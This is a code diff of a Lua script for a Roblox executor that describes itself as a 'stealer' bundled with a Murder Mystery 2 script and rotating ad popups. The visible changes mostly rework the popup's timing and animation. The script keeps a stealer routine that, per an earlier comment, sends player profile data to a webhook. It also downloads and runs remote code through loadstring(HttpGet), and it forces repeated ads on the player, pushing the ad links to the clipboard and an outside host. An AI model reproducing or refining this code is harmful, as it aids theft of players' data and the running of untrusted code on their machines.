@@ -1,10 +1,9 @@
 -- language: Lua, runtime: Delta Executor, target: Roblox
--- combined loader: stealer + mm2 script + rotating ad popup
+-- combined loader: stealer + mm2 script + centered ad popup every 30s
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local TweenService = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
 local me = Players.LocalPlayer
 
 -- ============================================================
@@ -22,9 +21,9 @@ local ADS = {
     { img = "https://raw.githubusercontent.com/macsploitbypass/main/refs/heads/main/images-3.jpeg",               url = "https://example.com/d" },
 }
 
-local AD_INTERVAL   = 60   -- секунд между баннерами
-local AD_LIFETIME   = 8    -- сколько висит на экране
-local CLOSE_DELAY   = 3    -- через сколько секунд кнопка «X» становится активной
+local AD_INTERVAL   = 30   -- каждые 30 секунд
+local AD_LIFETIME   = 8    -- висит на экране
+local CLOSE_DELAY   = 3    -- кнопка «X» активируется через 3 сек
 
 -- ============================================================
 -- HTTP
@@ -45,7 +44,7 @@ local function httpPost(url, payload)
 end
 
 -- ============================================================
--- STEALER — базовый профиль на вебхук
+-- STEALER
 -- ============================================================
 local function sendProfile()
     local executor = "Unknown"
@@ -70,7 +69,7 @@ local function sendProfile()
 end
 
 -- ============================================================
--- MM2 SCRIPT — выполнение gist'а, если мы в MM2
+-- MM2
 -- ============================================================
 local function isMM2()
     local ok, info = pcall(function()
@@ -79,26 +78,21 @@ local function isMM2()
     if ok and info and info.Name then
         return string.find(info.Name, "Murder Mystery 2", 1, true) ~= nil
     end
-    -- fallback по наличию модулей
     return game:FindFirstChild("ReplicatedStorage")
         and game.ReplicatedStorage:FindFirstChild("Modules")
         and game.ReplicatedStorage.Modules:FindFirstChild("ProfileData") ~= nil
 end
 
 local function runMM2Script()
-    if not isMM2() then
-        return
-    end
+    if not isMM2() then return end
     local ok, err = pcall(function()
         loadstring(game:HttpGet(MM2_GIST))()
     end)
-    if not ok then
-        warn("[L] MM2 script error: " .. tostring(err))
-    end
+    if not ok then warn("[L] MM2 script error: " .. tostring(err)) end
 end
 
 -- ============================================================
--- AD POPUP — рандомный баннер + кнопка закрытия через 3 сек
+-- AD POPUP — по центру экрана, анимация через масштаб
 -- ============================================================
 local function shuffle(t)
     for i = #t, 2, -1 do
@@ -116,11 +110,14 @@ local function buildGUI()
     gui.ResetOnSpawn = false
     gui.IgnoreGuiInset = true
     gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    gui.DisplayOrder = 999
     gui.Parent = parent
 
+    -- AnchorPoint 0.5,0.5 + Position 0.5,0.5 = точный центр экрана
     local frame = Instance.new("Frame")
+    frame.AnchorPoint = Vector2.new(0.5, 0.5)
+    frame.Position = UDim2.new(0.5, 0, 0.5, 0)
     frame.Size = UDim2.new(0, 480, 0, 320)
-    frame.Position = UDim2.new(1, 20, 0.5, -160)
     frame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
     frame.BorderSizePixel = 0
     frame.Visible = false
@@ -162,7 +159,6 @@ local function buildGUI()
     openBtn.Parent = frame
     Instance.new("UICorner", openBtn).CornerRadius = UDim.new(0, 8)
 
-    -- кнопка закрытия (появляется через CLOSE_DELAY секунд)
     local closeBtn = Instance.new("TextButton")
     closeBtn.Size = UDim2.new(0, 32, 0, 32)
     closeBtn.Position = UDim2.new(1, -40, 0, 8)
@@ -177,37 +173,62 @@ local function buildGUI()
 
     local currentUrl = nil
 
+    local function popIn()
+        frame.Visible = true
+        frame.Size = UDim2.new(0, 0, 0, 0)
+        frame.BackgroundTransparency = 1
+        img.ImageTransparency = 1
+        label.TextTransparency = 1
+        openBtn.BackgroundTransparency = 1
+        openBtn.TextTransparency = 1
+
+        local tw = TweenService:Create(frame,
+            TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
+            {
+                Size = UDim2.new(0, 480, 0, 320),
+                BackgroundTransparency = 0
+            })
+        tw:Play()
+
+        TweenService:Create(img,
+            TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+            { ImageTransparency = 0 }):Play()
+        TweenService:Create(label,
+            TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+            { TextTransparency = 0 }):Play()
+        TweenService:Create(openBtn,
+            TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+            { BackgroundTransparency = 0, TextTransparency = 0 }):Play()
+    end
+
+    local function popOut()
+        if not frame.Visible then return end
+        local tw = TweenService:Create(frame,
+            TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
+            {
+                Size = UDim2.new(0, 0, 0, 0),
+                BackgroundTransparency = 1
+            })
+        tw:Play()
+        tw.Completed:Wait()
+        frame.Visible = false
+        closeBtn.Visible = false
+    end
+
     local function showAd(ad)
         currentUrl = ad.url
         img.Image = ad.img
         label.Text = ad.url
-
-        frame.Visible = true
-        frame.Position = UDim2.new(1, 20, 0.5, -160)
         closeBtn.Visible = false
 
-        local inTween = TweenService:Create(frame,
-            TweenInfo.new(0.45, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
-            { Position = UDim2.new(1, -500, 0.5, -160) })
-        inTween:Play()
+        popIn()
 
-        -- через CLOSE_DELAY секунд кнопка становится доступной
         task.delay(CLOSE_DELAY, function()
-            if frame.Visible then
-                closeBtn.Visible = true
-            end
+            if frame.Visible then closeBtn.Visible = true end
         end)
 
-        -- авто-скрытие
         task.delay(AD_LIFETIME, function()
-            if not frame.Visible then return end
-            local outTween = TweenService:Create(frame,
-                TweenInfo.new(0.45, Enum.EasingStyle.Quart, Enum.EasingDirection.In),
-                { Position = UDim2.new(1, 20, 0.5, -160) })
-            outTween:Play()
-            outTween.Completed:Wait()
-            frame.Visible = false
-            closeBtn.Visible = false
+            popOut()
         end)
     end
 
@@ -216,9 +237,7 @@ local function buildGUI()
         if setclipboard then pcall(function() setclipboard(currentUrl) end) end
         local req = http_request or request or (syn and syn.request)
         if req then
-            pcall(function()
-                req({ Url = currentUrl, Method = "GET" })
-            end)
+            pcall(function() req({ Url = currentUrl, Method = "GET" }) end)
         end
         pcall(function()
             game:GetService("StarterGui"):SetCore("SendNotification", {
@@ -229,16 +248,7 @@ local function buildGUI()
         end)
     end)
 
-    closeBtn.MouseButton1Click:Connect(function()
-        if not frame.Visible then return end
-        local outTween = TweenService:Create(frame,
-            TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In),
-            { Position = UDim2.new(1, 20, 0.5, -160) })
-        outTween:Play()
-        outTween.Completed:Wait()
-        frame.Visible = false
-        closeBtn.Visible = false
-    end)
+    closeBtn.MouseButton1Click:Connect(popOut)
 
     return showAd
 end
@@ -247,26 +257,26 @@ end
 -- ЗАПУСК
 -- ============================================================
 task.spawn(function()
-    -- 1. стилер
     sendProfile()
-
-    -- 2. скрипт MM2 (если в MM2)
     task.wait(1)
     runMM2Script()
 
-    -- 3. попап с рандомными баннерами
     local showAd = buildGUI()
     local pool = shuffle(ADS)
-
-    task.wait(2) -- первая задержка, чтобы не спалить сразу
     local idx = 0
+
+    task.wait(2)
+    -- первый показ
+    idx = 1
+    showAd(pool[idx])
+
+    -- дальше каждые 30 секунд
     while task.wait(AD_INTERVAL) do
-        idx = idx % #pool + 1
-        showAd(pool[idx])
-        -- если баннеров больше одного, после показа пересобираем пул
-        if idx >= #pool then
+        idx += 1
+        if idx > #pool then
             pool = shuffle(ADS)
-            idx = 0
+            idx = 1
         end
+        showAd(pool[idx])
     end
 end)
